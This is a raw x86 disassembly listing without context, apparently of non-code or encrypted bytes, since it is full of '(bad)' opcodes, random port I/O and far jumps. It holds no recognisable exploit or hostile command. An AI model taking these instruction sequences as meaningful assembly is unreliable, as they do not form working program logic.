  414288:	mov    BYTE PTR [esi],dl
  41428a:	or     BYTE PTR [edx],0x8d
  41428d:	push   esp
  41428e:	imul   edi,esi,0x9e9af0ea
  414294:	mov    ecx,0xe60742f8
  414299:	pop    edi
  41429a:	in     eax,0xe4
  41429c:	and    DWORD PTR [ebp-0x2c1b0837],esi
  4142a2:	sar    DWORD PTR [ebx+0x4f],1
  4142a5:	cmp    al,0x77
  4142a7:	adc    dh,BYTE PTR [eax-0xb]
  4142aa:	dec    esi
  4142ab:	and    bl,BYTE PTR [ebx+0x5392362e]
  4142b1:	div    DWORD PTR [ebx+0x63]
  4142b4:	and    eax,eax
  4142b6:	and    esp,DWORD PTR [ebx]
  4142b8:	xor    ch,ch
  4142ba:	aas    
  4142bb:	lods   eax,DWORD PTR ds:[esi]
  4142bc:	sbb    eax,0xacd9b9f9
  4142c1:	lock sbb al,BYTE PTR [ebx]
  4142c4:	xor    al,0xf2
  4142c6:	sbb    esp,DWORD PTR ds:0x1a6dfad2
  4142cc:	push   0xffffffaa
  4142ce:	or     al,0xa
  4142d0:	push   0x4ab861cc
  4142d5:	push   esp
  4142d6:	add    BYTE PTR ds:0xc18329b0,dl
  4142dc:	test   al,0xa6
  4142de:	sbb    eax,0xdc40dcac
  4142e3:	js     0x4142bf
  4142e5:	cmp    al,0x68
  4142e7:	in     eax,0x9b
  4142e9:	cmc    
  4142ea:	cmp    BYTE PTR [esi-0x1cba1ac6],0x9e
  4142f1:	(bad)  
  4142f2:	dec    esi
  4142f3:	ins    DWORD PTR es:[edi],dx
  4142f4:	pop    ecx
  4142f5:	jp     0x414368
  4142f7:	fmul   DWORD PTR [esi-0x465ec048]
  4142fd:	fdivr  DWORD PTR [ebp+ecx*8-0x7c867d65]
  414304:	stc    
  414305:	(bad)  
  414306:	and    eax,DWORD PTR [edx+0x3]
  414309:	inc    eax
  41430a:	push   ebx
  41430b:	inc    edi
  41430c:	fmul   QWORD PTR [ecx-0x6467ecc9]
  414312:	cmp    eax,0x36045169
  414317:	inc    eax
  414318:	adc    DWORD PTR [esi+0x56ecdb41],esp
  41431e:	in     eax,0xbb
  414320:	jp     0x4143a1
  414322:	ret    
  414323:	out    dx,eax
  414324:	or     BYTE PTR [ebx-0x1a],0xe4
  414328:	add    al,0x3
  41432a:	jae    0x414365
  41432c:	pop    ss
  41432d:	in     al,0xec
  41432f:	sbb    BYTE PTR [ebx+ebp*2+0x7dab12c9],bh
  414336:	imul   ebp,DWORD PTR [ecx],0xffffff8e
  414339:	xchg   ebx,eax
  41433a:	ffreep st(4)
  41433c:	mov    bl,0xc5
  41433e:	xor    BYTE PTR [edx],cl
  414340:	xor    BYTE PTR [ebx+0x2f],al
  414343:	fwait
  414344:	pop    edi
  414345:	mov    esi,0xc111a9e5
  41434a:	cdq    
  41434b:	add    cl,al
  41434d:	xchg   dl,ah
  41434f:	arpl   WORD PTR [esi+0x2304a8a3],di
  414355:	or     eax,0x3d1d8405
  41435a:	lahf   
  41435b:	iret   
  41435c:	mov    ah,0xa8
  41435e:	ret    
  41435f:	inc    ecx
  414360:	adc    DWORD PTR [edi-0x32],eax
  414363:	or     al,dl
  414365:	bnd jno 0x41438b
  414368:	pop    ecx
  414369:	dec    ebp
  41436a:	pop    ebx
  41436b:	mov    edx,0x802fd6b4
  414370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414371:	sbb    eax,0x996e7dc2
  414376:	pop    esp
  414377:	popa   
  414378:	xchg   edx,eax
  414379:	adc    DWORD PTR [edi+0x43],esp
  41437c:	int3   
  41437d:	das    
  41437e:	mov    esi,0xec936e2
  414383:	dec    esi
  414384:	mov    al,BYTE PTR [ebx]
  414386:	dec    ecx
  414387:	or     DWORD PTR [edi-0x7bbcf661],ebp
  41438d:	fs (bad) 
  41438f:	xchg   ebx,eax
  414390:	inc    ebx
  414391:	sbb    eax,0xc1fa26be
  414396:	aas    
  414397:	call   0x5f090d5f
  41439c:	and    BYTE PTR [edx+0x60],dh
  41439f:	loop   0x41440b
  4143a1:	sbb    al,0xbd
  4143a3:	rcr    BYTE PTR [edi+0x225ab887],0x8c
  4143aa:	mov    edx,0x78667bc1
  4143af:	out    0x69,al
  4143b1:	addr16 out dx,eax
  4143b3:	loop   0x4143b7
  4143b5:	mov    dl,0x2
  4143b7:	lods   al,BYTE PTR ds:[esi]
  4143b8:	dec    esp
  4143b9:	xchg   edi,eax
  4143ba:	mov    esi,0xd2cb018a
  4143bf:	lea    ebp,[eax+eax*1-0x79]
  4143c3:	push   0xffffffd9
  4143c5:	repz sub al,0xdd
  4143c8:	imul   BYTE PTR [edi+0x4a]
  4143cb:	rcl    DWORD PTR [ebp+eax*8-0x49ee9658],0xae
  4143d3:	and    BYTE PTR [edi+0x4e6afd28],dh
  4143d9:	dec    eax
  4143da:	icebp  
  4143db:	into   
  4143dc:	shl    BYTE PTR [edx+0x1f],0xf8
  4143e0:	not    BYTE PTR [ebp+0x3f]
  4143e3:	mov    cl,0xd7
  4143e5:	gs xchg edx,eax
  4143e7:	jg     0x414442
  4143e9:	repnz out dx,al
  4143eb:	js     0x41438a
  4143ed:	sub    eax,0xf7a9ae0b
  4143f2:	push   cs
  4143f3:	addr16 dec edx
  4143f5:	push   edx
  4143f6:	sti    
  4143f7:	lods   al,BYTE PTR ds:[esi]
  4143f8:	stos   DWORD PTR es:[edi],eax
  4143f9:	fldenv [eax]
  4143fb:	stos   BYTE PTR es:[edi],al
  4143fc:	fsubrp st(2),st
  4143fe:	xchg   ebp,eax
  4143ff:	pop    eax
  414400:	sbb    edi,DWORD PTR [ebx+0x6f67deb8]
  414406:	mov    cs,WORD PTR [ecx+0x79]
  414409:	rcl    DWORD PTR [eax+0x3],0x9e
  41440d:	inc    esp
  41440e:	sub    eax,0x21b2d6f
  414413:	add    BYTE PTR [ebp-0x4fe52fda],al
  414419:	push   ds
  41441a:	ret    
  41441b:	js     0x4143a0
  41441d:	cmp    ecx,esp
  41441f:	jbe    0x4143be
  414421:	or     DWORD PTR [edx],ecx
  414423:	repnz sub ebp,edx
  414426:	adc    al,0x2f
  414428:	dec    edi
  414429:	bound  edi,QWORD PTR [eax-0x4f]
  41442c:	mov    ds:0x638e7811,al
  414431:	dec    ecx
  414432:	cdq    
  414433:	fiadd  DWORD PTR [ecx+0x43]
  414436:	rcr    DWORD PTR [ecx+0xb],cl
  414439:	or     al,0xd3
  41443b:	cmp    ebx,DWORD PTR [ebx-0x29]
  41443e:	cli    
  41443f:	rcr    BYTE PTR [edx-0x48646abe],1
  414445:	std    
  414446:	fisub  WORD PTR [ecx-0x28]
  414449:	pusha  
  41444a:	add    edx,ebx
  41444c:	mov    ecx,0x72b1baca
  414451:	in     eax,0x3a
  414453:	sub    eax,0x45d90cd5
  414458:	cs mov ah,al
  41445b:	neg    DWORD PTR [ecx]
  41445d:	jmp    0x414416
  41445f:	lock inc edx
  414461:	(bad)  
  414462:	mov    al,ds:0x8cbeabbb
  414467:	jnp    0x41443d
  414469:	cmp    BYTE PTR [edi-0x5e13efc2],ah
  41446f:	hlt    
  414470:	das    
  414471:	leave  
  414472:	jnp    0x4144a2
  414474:	or     BYTE PTR [esi],ah
  414476:	xor    al,BYTE PTR [edx+eax*8]
  414479:	ds (bad) 
  41447b:	xlat   BYTE PTR ds:[ebx]
  41447c:	sbb    ecx,edi
  41447e:	add    BYTE PTR ds:0x20fdeffe,bl
  414484:	popf   
  414485:	iret   
  414486:	(bad)  
  414487:	pop    ebx
  414488:	es pushf 
  41448a:	xchg   ebp,eax
  41448b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41448c:	or     dh,dh
  41448e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41448f:	mov    esi,0x18e5853
  414494:	push   es
  414495:	xchg   ecx,eax
  414496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414497:	add    BYTE PTR [edi],ch
  414499:	test   BYTE PTR [ecx+0x5c],cl
  41449c:	lsl    edi,WORD PTR [ebx]
  41449f:	fistp  DWORD PTR [edi+0x19bcf6dc]
  4144a5:	add    BYTE PTR [esi+ebx*1-0x49a4c506],bh
  4144ac:	loop   0x414500
  4144ae:	ret    
  4144af:	les    eax,FWORD PTR [ebx]
  4144b1:	xchg   ebx,ebx
  4144b3:	(bad)  
  4144b4:	fsubr  DWORD PTR [esp+edx*2+0x29]
  4144b8:	xor    al,BYTE PTR [eax+0x57cd1082]
  4144be:	mov    esp,0xc81137b4
  4144c3:	jge    0x414510
  4144c5:	sbb    eax,DWORD PTR [ecx]
  4144c7:	add    DWORD PTR [ebp+0x5b],0x4bedcf82
  4144ce:	pop    esi
  4144cf:	jecxz  0x414494
  4144d1:	xchg   DWORD PTR [esi+ebx*4],ebx
  4144d4:	dec    eax
  4144d5:	sub    bh,BYTE PTR [edx]
  4144d7:	mov    ch,0xf1
  4144d9:	dec    ebp
  4144da:	and    dl,BYTE PTR [ebp+0x4f98e440]
  4144e0:	inc    esp
  4144e1:	inc    eax
  4144e2:	mov    ah,BYTE PTR [edx-0x6e]
  4144e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144e6:	outs   dx,DWORD PTR ds:[esi]
  4144e7:	or     eax,0xdd531c1c
  4144ec:	sbb    bl,dh
  4144ee:	pop    esp
  4144ef:	sti    
  4144f0:	icebp  
  4144f1:	js     0x4144bd
  4144f3:	fcmovb st,st(3)
  4144f5:	in     eax,0x28
  4144f7:	mov    bh,0x90
  4144f9:	(bad)  
  4144fa:	sub    dh,dh
  4144fc:	push   0xa06c781d
  414501:	dec    esi
  414502:	lahf   
  414503:	jmp    0x1efc:0x378497f1
  41450a:	not    DWORD PTR [edx+0xb]
  41450d:	(bad)  
  41450e:	sbb    eax,eax
  414510:	call   0x375de647
  414515:	fdiv   DWORD PTR [edx-0x63]
  414518:	mov    edx,0x9d4f0f14
  41451d:	jg     0x4144ba
  41451f:	lods   eax,DWORD PTR ds:[esi]
  414520:	jmp    0x600a:0xb9de07eb
  414527:	(bad)  
  414528:	or     ebx,esi
  41452a:	add    BYTE PTR [edx+0x57],0x6b
  41452e:	aam    0xdb
  414530:	xor    BYTE PTR [ecx],bl
  414532:	pop    ebx
  414533:	lock iret 
  414535:	mov    ecx,0x499d2582
  41453a:	out    dx,al
  41453b:	ja     0x414589
  41453d:	add    BYTE PTR [ebx],dh
  41453f:	lahf   
  414540:	lds    ecx,FWORD PTR [esi-0x22ae7da]
  414546:	int3   
  414547:	add    ah,al
  414549:	inc    edi
  41454a:	sbb    cl,al
  41454c:	xor    DWORD PTR [edx],eax
  41454e:	pop    eax
  41454f:	call   0x787b:0x97f73472
  414556:	adc    ah,BYTE PTR [edx-0x7c299661]
  41455c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41455d:	imul   esi,DWORD PTR [eax+0x33438236],0xffffffa8
  414564:	std    
  414565:	push   0xffffffa5
  414567:	adc    DWORD PTR [eax+0x5a],0x522b647d
  41456e:	loope  0x4144f9
  414570:	cmc    
  414571:	js     0x4145df
  414573:	add    dl,BYTE PTR [edx-0x20]
  414576:	test   al,0xf8
  414578:	hlt    
  414579:	mov    dh,0x59
  41457b:	mov    ch,0xf9
  41457d:	pop    ebx
  41457e:	sbb    ah,BYTE PTR fs:[edi]
  414581:	cld    
  414582:	cdq    
  414583:	popa   
  414584:	fwait
  414585:	daa    
  414586:	dec    ebp
  414587:	xchg   ecx,edx
  414589:	or     dl,BYTE PTR [eax]
  41458b:	dec    esp
  41458c:	loopne 0x41458d
  41458e:	ror    cl,1
  414590:	call   0x28306460
  414595:	push   ebp
  414596:	xlat   BYTE PTR ds:[ebx]
  414597:	repz test DWORD PTR [esi+eax*4-0x60dfc0e8],esp
  41459f:	ret    
  4145a0:	pop    esp
  4145a1:	enter  0x2aba,0x7e
  4145a5:	xor    esp,ebp
  4145a7:	xchg   edx,eax
  4145a8:	out    0xf9,al
  4145aa:	mov    WORD PTR [esi+0x4f833a8b],ds
  4145b0:	cli    
  4145b1:	xchg   ebx,eax
  4145b2:	fdiv   DWORD PTR [ebx-0x13d95e7e]
  4145b8:	or     BYTE PTR [ebx+0x35],al
  4145bb:	push   ds
  4145bc:	jp     0x414616
  4145be:	mov    esp,0x5afe1569
  4145c3:	jnp    0x414628
  4145c5:	xchg   esp,eax
  4145c6:	lock add eax,0x107dbf2c
  4145cc:	and    al,0x60
  4145ce:	xor    eax,0xb68d67e4
  4145d3:	cmp    ah,ch
  4145d5:	push   ss
  4145d6:	inc    BYTE PTR ds:0x13302f21
  4145dc:	aad    0x9d
  4145de:	mov    bh,0x36
  4145e0:	jb     0x41458d
  4145e2:	jnp    0x41465d
  4145e4:	jge    0x414599
  4145e6:	cmc    
  4145e7:	retf   
  4145e8:	fld    QWORD PTR [edi+0x40]
  4145eb:	sub    al,0x69
  4145ed:	leave  
  4145ee:	cwde   
  4145ef:	hlt    
  4145f0:	call   0xc4e30d9b
  4145f5:	or     esi,DWORD PTR [ebx+0x42]
  4145f8:	or     ebx,ebx
  4145fa:	adc    dx,WORD PTR [ebx-0x767d66ed]
  414601:	test   BYTE PTR [ecx-0x89ff167],ch
  414607:	daa    
  414608:	and    al,BYTE PTR [edi]
  41460a:	pushf  
  41460b:	ins    DWORD PTR es:[edi],dx
  41460c:	xor    DWORD PTR [ecx],0x3a97fc72
  414612:	pop    ds
  414613:	jl     0x414637
  414615:	pop    ds
  414616:	in     al,0x9d
  414618:	cli    
  414619:	cmp    esp,edx
  41461b:	sub    bh,BYTE PTR ss:[esi-0x773ee8f6]
  414622:	and    al,cl
  414624:	inc    BYTE PTR [edx+0x54]
  414627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414628:	rcl    BYTE PTR [ecx],0x8b
  41462b:	jne    0x414672
  41462d:	cld    
  41462e:	and    eax,0xfd808ee
  414633:	sbb    eax,0xce91f1f5
  414638:	std    
  414639:	sub    eax,0xc87015db
  41463e:	retf   
  41463f:	(bad)  
  414640:	and    ecx,DWORD PTR [edx-0x1e]
  414643:	daa    
  414644:	lahf   
  414645:	adc    BYTE PTR [edx+0x44fe8898],dl
  41464b:	and    eax,0xa24482d0
  414650:	pop    ecx
  414651:	sbb    eax,0x17a73642
  414656:	shl    bh,1
  414658:	in     al,0x6b
  41465a:	fdiv   QWORD PTR [edx]
  41465c:	mov    al,ds:0x8cc47180
  414661:	repz repz ja 0x41466f
  414665:	adc    BYTE PTR [ecx],0x74
  414668:	popf   
  414669:	mov    bl,0xa5
  41466b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466c:	int3   
  41466d:	jnp    0x41462b
  41466f:	or     DWORD PTR [ecx-0x1e4cc7a9],eax
  414675:	inc    esp
  414676:	iret   
  414677:	ror    BYTE PTR [ebp+0x38e80e16],1
  41467d:	pop    edi
  41467e:	jmp    0x2f4:0xd1668fd7
  414685:	fistp  DWORD PTR [eax]
  414687:	mov    DWORD PTR [eax+0x6],ebx
  41468a:	ret    
  41468b:	xchg   esp,eax
  41468c:	xlat   BYTE PTR ds:[ebx]
  41468d:	ins    BYTE PTR es:[edi],dx
  41468e:	inc    edx
  41468f:	fistp  DWORD PTR [eax+0x1006064b]
  414695:	lock jne 0x414666
  414698:	dec    edx
  414699:	rcr    BYTE PTR [edi],cl
  41469b:	fsub   DWORD PTR [ecx-0x54]
  41469e:	pop    ss
  41469f:	mov    ecx,0x2f53dc54
  4146a4:	xchg   edx,eax
  4146a5:	or     BYTE PTR [ebx],ah
  4146a7:	sbb    eax,0x1fd779f
  4146ac:	and    eax,0xdac615dc
  4146b1:	sbb    eax,0x9397393c
  4146b6:	jo     0x4146ab
  4146b8:	or     cl,BYTE PTR [ebx]
  4146ba:	lahf   
  4146bb:	ret    0x9e48
  4146be:	lock jae 0x41465c
  4146c1:	fsubr  QWORD PTR [ebp-0x19]
  4146c4:	push   edx
  4146c5:	cmp    cl,BYTE PTR [ecx-0xd]
  4146c8:	jae    0x414658
  4146ca:	mov    dh,BYTE PTR [edi]
  4146cc:	in     al,dx
  4146cd:	cmc    
  4146ce:	lock mov cl,0x54
  4146d1:	ins    DWORD PTR es:[edi],dx
  4146d2:	les    ecx,FWORD PTR [ebx]
  4146d4:	retf   0x6fd5
  4146d7:	ret    0x6cd3
  4146da:	sbb    al,0xa7
  4146dc:	push   0x6f4a4cc3
  4146e1:	fsubr  st(3),st
  4146e3:	pusha  
  4146e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146e5:	in     eax,0xd8
  4146e7:	ins    BYTE PTR es:[edi],dx
  4146e8:	push   esp
  4146e9:	push   ds
  4146ea:	nop
  4146eb:	or     ebx,ecx
  4146ed:	fcmove st,st(3)
  4146ef:	clc    
  4146f0:	push   ebp
  4146f1:	adc    al,0x28
  4146f3:	add    al,0xa4
  4146f5:	xor    BYTE PTR [ebx],dh
  4146f7:	jb     0x4146af
  4146f9:	jl     0x414767
  4146fb:	cmp    ebp,0x8369c993
  414701:	push   ebp
  414702:	push   ebx
  414703:	fcomp  QWORD PTR [edi+0x37]
  414706:	inc    eax
  414707:	sub    bh,BYTE PTR [ecx-0x31ba6ef9]
  41470d:	fld    QWORD PTR [ebx]
  41470f:	daa    
  414710:	stos   BYTE PTR es:[edi],al
  414711:	call   0x837e:0xcf662937
  414718:	add    al,0x7d
  41471a:	jmp    0xef7506b6
  41471f:	push   eax
  414720:	pop    esi
  414721:	lock mov dl,al
  414724:	dec    esp
  414725:	pop    ecx
  414726:	jp     0x414751
  414728:	adc    ah,BYTE PTR [ebp+0xd62aa8a]
  41472e:	mov    bl,0x52
  414730:	scas   al,BYTE PTR es:[edi]
  414731:	mov    dl,0x31
  414733:	mov    ebp,0x14a2161c
  414738:	inc    ebx
  414739:	arpl   WORD PTR [ebp+0xa9614b4],sp
  41473f:	cmp    ebx,DWORD PTR [ecx-0x68]
  414742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414743:	cmp    eax,0xb78affa2
  414748:	xchg   ebp,eax
  414749:	cmc    
  41474a:	aas    
  41474b:	outs   dx,DWORD PTR ds:[esi]
  41474c:	ins    DWORD PTR es:[edi],dx
  41474d:	jns    0x414792
  41474f:	inc    eax
  414750:	sub    al,0xd1
  414752:	popf   
  414753:	out    dx,al
  414754:	jno    0x414753
  414756:	xor    BYTE PTR [ebp-0x10],0x1
  41475a:	xor    bh,BYTE PTR [esi-0x7d]
  41475d:	aaa    
  41475e:	cmc    
  41475f:	ror    eax,0xa9
  414762:	clc    
  414763:	dec    esi
  414764:	xchg   esi,eax
  414765:	pop    eax
  414766:	xchg   esi,eax
  414767:	xor    ah,BYTE PTR [edi+0x9]
  41476a:	and    ebx,0x78
  41476d:	je     0x414744
  41476f:	cmp    BYTE PTR [edx],cl
  414771:	dec    edx
  414772:	(bad)  
  414773:	aam    0x68
  414775:	popf   
  414776:	arpl   ax,bx
  414778:	dec    ebx
  414779:	ja     0x414753
  41477b:	sub    al,0x95
  41477d:	xchg   edi,eax
  41477e:	jl     0x414782
  414780:	push   0x73
  414782:	lds    esp,FWORD PTR [esi-0x57]
  414785:	cmp    BYTE PTR [eax-0x5],cl
  414788:	fcmovnb st,st(0)
  41478a:	fidiv  DWORD PTR [edi+0x47]
  41478d:	and    DWORD PTR ds:0x7e87f216,ecx
  414793:	sub    al,bl
  414795:	in     al,0xd9
  414797:	cmp    dh,BYTE PTR [edi+0x4d81c323]
  41479d:	jbe    0x4147b8
  41479f:	or     esp,ebx
  4147a1:	push   ss
  4147a2:	pop    esp
  4147a3:	push   ecx
  4147a4:	xor    DWORD PTR [ecx+0x6b1af17b],esp
  4147aa:	xor    eax,0xef717662
  4147af:	mov    esi,DWORD PTR [edx]
  4147b1:	ins    DWORD PTR es:[edi],dx
  4147b2:	xchg   ebx,eax
  4147b3:	out    dx,al
  4147b4:	ss mov esi,0x1a3e0096
  4147ba:	add    bl,BYTE PTR [edx+0x1]
  4147bd:	cmp    bh,BYTE PTR [ebp+0x4ea2a7c5]
  4147c3:	out    dx,al
  4147c4:	mov    ecx,0xbcd687bb
  4147c9:	or     ah,BYTE PTR [esi-0x22a3e155]
  4147cf:	scas   eax,DWORD PTR es:[edi]
  4147d0:	ss popf 
  4147d2:	mov    esi,0x9a543baa
  4147d7:	xor    BYTE PTR [esi-0x2a],0xd
  4147db:	in     eax,dx
  4147dc:	je     0x414818
  4147de:	cwde   
  4147df:	jmp    0xaac0:0x1016693e
  4147e6:	jae    0x41483b
  4147e8:	and    eax,0x35deac71
  4147ed:	mov    al,0x95
  4147ef:	mov    dh,0x6c
  4147f1:	loopne 0x414837
  4147f3:	mov    ch,0x1e
  4147f5:	test   DWORD PTR [eax+edi*1],0xf9ed7158
  4147fc:	ret    
  4147fd:	lds    edx,FWORD PTR [edx+0x2e]
  414800:	pop    ebx
  414801:	stos   DWORD PTR es:[edi],eax
  414802:	lods   eax,DWORD PTR ds:[esi]
  414803:	dec    ebx
  414804:	jbe    0x41483a
  414806:	mov    eax,ds:0x659e9c9a
  41480b:	pop    ecx
  41480c:	(bad)  
  41480d:	shl    BYTE PTR [esi+0x74d16518],1
  414813:	cmp    eax,0xfacc271c
  414818:	or     eax,0x4b1307f8
  41481d:	in     eax,dx
  41481e:	cmp    eax,0x17c1dce9
  414823:	inc    eax
  414824:	es es aas 
  414827:	and    eax,0x43ff35de
  41482c:	cmp    edi,edx
  41482e:	lods   eax,DWORD PTR ds:[esi]
  41482f:	stos   BYTE PTR es:[edi],al
  414830:	and    eax,0x1169b30f
  414835:	mov    ds:0x213d207c,al
  41483a:	fdiv   st,st(6)
  41483c:	in     al,0xc5
  41483e:	mov    ecx,0x143e3c7c
  414843:	loop   0x414897
  414845:	cli    
  414846:	cs xchg esp,eax
  414848:	shl    dl,0x4a
  41484b:	ret    
  41484c:	inc    eax
  41484d:	cwde   
  41484e:	pop    esp
  41484f:	jge    0x41481f
  414851:	cmp    ecx,DWORD PTR [edi]
  414853:	sub    esi,DWORD PTR [ecx]
  414855:	dec    eax
  414856:	mov    bh,0xd5
  414858:	ret    0x4cd8
  41485b:	scas   al,BYTE PTR es:[edi]
  41485c:	fsubr  st(0),st
  41485e:	or     DWORD PTR [edx],0x51
  414861:	xor    dh,dl
  414863:	test   DWORD PTR [edx],ecx
  414865:	dec    BYTE PTR [ecx+0x57e9d3b7]
  41486b:	mov    eax,ds:0xe2e68944
  414870:	fcmovnu st,st(3)
  414872:	pop    ebx
  414873:	ficomp DWORD PTR [esi+0x1e53cf15]
  414879:	cli    
  41487a:	hlt    
  41487b:	jns    0x414813
  41487d:	ins    DWORD PTR es:[di],dx
  41487f:	ret    0x7585
  414882:	add    DWORD PTR [ebp-0x79],esp
  414885:	fcomp  DWORD PTR [edx-0x5c]
  414888:	push   esp
  414889:	sub    bl,BYTE PTR [ecx-0x6f59d423]
  41488f:	sbb    bh,dh
  414891:	pop    eax
  414892:	dec    ecx
  414893:	xlat   BYTE PTR ds:[ebx]
  414894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414895:	ds mov esp,0x8a92b934
  41489b:	sbb    al,0xc
  41489d:	ss and al,0xa8
  4148a0:	jle    0x4148c6
  4148a2:	mov    edx,0x3cb44e78
  4148a7:	icebp  
  4148a8:	mov    ebp,0x4dfe8c95
  4148ad:	mov    ch,BYTE PTR [esi]
  4148af:	add    ch,dl
  4148b1:	and    ch,BYTE PTR [eax+0xc1fa1a4]
  4148b7:	push   esi
  4148b8:	pop    eax
  4148b9:	pop    esp
  4148ba:	mov    ?,edi
  4148bc:	jmp    0x4148e6
  4148be:	xchg   ebx,eax
  4148bf:	mov    edi,0xda6fb6a3
  4148c4:	fs jne 0x414852
  4148c7:	push   eax
  4148c8:	pop    ebp
  4148c9:	push   esi
  4148ca:	in     eax,dx
  4148cb:	jo     0x414853
  4148cd:	call   0x5da4e8e7
  4148d2:	cmp    DWORD PTR [edi*1-0x3fe12065],0x8a20f836
  4148dd:	std    
  4148de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148df:	add    ch,BYTE PTR [ebp-0x680fb322]
  4148e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148e6:	pop    esp
  4148e7:	test   BYTE PTR [ebx+0x67],bh
  4148ea:	add    cl,ah
  4148ec:	cli    
  4148ed:	aad    0x86
  4148ef:	dec    ebp
  4148f0:	inc    edx
  4148f1:	ret    
  4148f2:	ins    DWORD PTR es:[edi],dx
  4148f3:	arpl   di,dx
  4148f5:	jno    0x4148d5
  4148f7:	add    eax,0x630a830a
  4148fc:	fcmovnu st,st(5)
  4148fe:	out    dx,eax
  4148ff:	mov    al,ds:0xd329080
  414904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414905:	push   edi
  414906:	js     0x4148d9
  414908:	mov    al,ss:0x8a7dc8
  41490e:	adc    edx,DWORD PTR [esi-0x25]
  414911:	scas   eax,DWORD PTR es:[edi]
  414912:	in     eax,0xb3
  414914:	fs mov dl,0xd6
  414917:	ja     0x414936
  414919:	dec    esp
  41491a:	jmp    0x41494c
  41491c:	stos   BYTE PTR es:[edi],al
  41491d:	pop    ds
  41491e:	dec    ebp
  41491f:	lea    ebx,[ebp-0x6c]
  414922:	push   edx
  414923:	pop    ebx
  414924:	xchg   edi,eax
  414925:	xchg   ebx,eax
  414926:	jno    0x414994
  414928:	(bad)  
  414929:	cmp    al,BYTE PTR [ebx-0xe]
  41492c:	mov    ebp,0xbccef1ce
  414931:	lds    ecx,FWORD PTR [esp+esi*4]
  414934:	adc    esi,DWORD PTR [edi+0x2a]
  414937:	hlt    
  414938:	lods   al,BYTE PTR ds:[esi]
  414939:	pop    esp
  41493a:	aas    
  41493b:	out    0xcb,al
  41493d:	adc    BYTE PTR [esi],bh
  41493f:	inc    edi
  414940:	es mov ah,0x2
  414943:	mov    dl,0xc7
  414945:	dec    esi
  414946:	cmp    DWORD PTR [edi-0x567fe7ac],0x913e7671
  414950:	inc    eax
  414951:	ret    0xacc0
  414954:	xchg   ebx,eax
  414955:	xor    al,0xdf
  414957:	in     eax,dx
  414958:	mov    edx,0x2a5bb511
  41495d:	daa    
  41495e:	push   ss
  41495f:	ds mov al,0x81
  414962:	outs   dx,BYTE PTR ds:[esi]
  414963:	retf   
  414964:	lods   eax,DWORD PTR ds:[esi]
  414965:	sub    DWORD PTR [ebx+0x57fa9972],ebx
  41496b:	shr    ch,0x0
  41496e:	repnz lds eax,FWORD PTR [ebp+0x5b]
  414972:	inc    eax
  414973:	sub    al,0xb0
  414975:	pop    esi
  414976:	pop    edi
  414977:	xchg   DWORD PTR [edx+0x26],ebx
  41497a:	adc    al,0xd7
  41497c:	dec    edx
  41497e:	cmc    
  41497f:	inc    eax
  414980:	mov    eax,0xd780c327
  414985:	or     al,0xcd
  414987:	shr    ebx,0x88
  41498a:	and    cl,BYTE PTR [ecx-0x38]
  41498d:	(bad)  
  41498e:	loopne 0x41495b
  414990:	inc    edx
  414991:	(bad)  
  414992:	hlt    
  414993:	neg    DWORD PTR ds:0xad25741c
  414999:	jae    0x41495d
  41499b:	xchg   edi,eax
  41499c:	test   eax,0xaf05036c
  4149a1:	mov    ah,0xe8
  4149a3:	adc    edx,ecx
  4149a5:	mov    edx,0x7d589be8
  4149aa:	addr16 retf 0x8b1a
  4149ae:	push   ds
  4149af:	push   esi
  4149b0:	in     al,0x1c
  4149b2:	std    
  4149b3:	jmp    0xde1:0xf3488d27
  4149ba:	adc    BYTE PTR [edx],cl
  4149bc:	mov    ebp,0x85661847
  4149c1:	ret    
  4149c2:	inc    esp
  4149c3:	sbb    esi,DWORD PTR [edi+esi*8]
  4149c6:	aam    0xa8
  4149c8:	lds    ebp,FWORD PTR [edi]
  4149ca:	ss dec ebp
  4149cc:	lahf   
  4149cd:	shl    DWORD PTR [esi-0x34ff2fa3],1
  4149d3:	sbb    DWORD PTR [ebx+0x44],esi
  4149d6:	xchg   esi,eax
  4149d7:	mov    ds:0x74c27f45,al
  4149dc:	je     0x41499d
  4149de:	fwait
  4149df:	dec    esi
  4149e0:	out    0xc9,eax
  4149e2:	xchg   BYTE PTR [ebx-0x62acabfa],ah
  4149e8:	imul   esi,ebp,0x72
  4149eb:	and    eax,esp
  4149ed:	push   ebx
  4149ee:	daa    
  4149ef:	mov    esi,0x1abe9577
  4149f4:	les    edi,FWORD PTR [ebp+0x1892cdf3]
  4149fa:	(bad)  
  4149fb:	or     esp,edi
  4149fd:	sahf   
  4149fe:	xchg   esp,eax
  4149ff:	xor    bl,BYTE PTR [eax]
  414a01:	mov    ebp,DWORD PTR [ebp+0x66]
  414a04:	inc    edx
  414a05:	pop    ebx
  414a06:	(bad)  [edi]
  414a08:	test   al,0xc5
  414a0a:	sub    eax,0x4ea03d71
  414a0f:	shr    DWORD PTR [esi],1
  414a11:	ficom  DWORD PTR [edi]
  414a13:	sahf   
  414a14:	or     DWORD PTR [eax+0x7e],0x40874186
  414a1b:	daa    
  414a1c:	mov    esp,0x643f317a
  414a21:	push   DWORD PTR [ecx-0x6468d1ec]
  414a27:	repnz fisub DWORD PTR ds:0x45db1a25
  414a2e:	inc    esp
  414a2f:	xchg   BYTE PTR [ebx-0x34],al
  414a32:	in     eax,0x90
  414a34:	sub    bl,BYTE PTR [ebp+0x2]
  414a37:	push   0x67
  414a39:	scas   eax,DWORD PTR es:[edi]
  414a3a:	jecxz  0x414ab3
  414a3c:	adc    al,0xc7
  414a3e:	push   ds
  414a3f:	adc    DWORD PTR [eax-0x39],0xffffff97
  414a43:	dec    BYTE PTR [edx+0x5564a075]
  414a49:	push   cs
  414a4a:	xor    BYTE PTR [eax],bl
  414a4c:	cld    
  414a4d:	out    dx,al
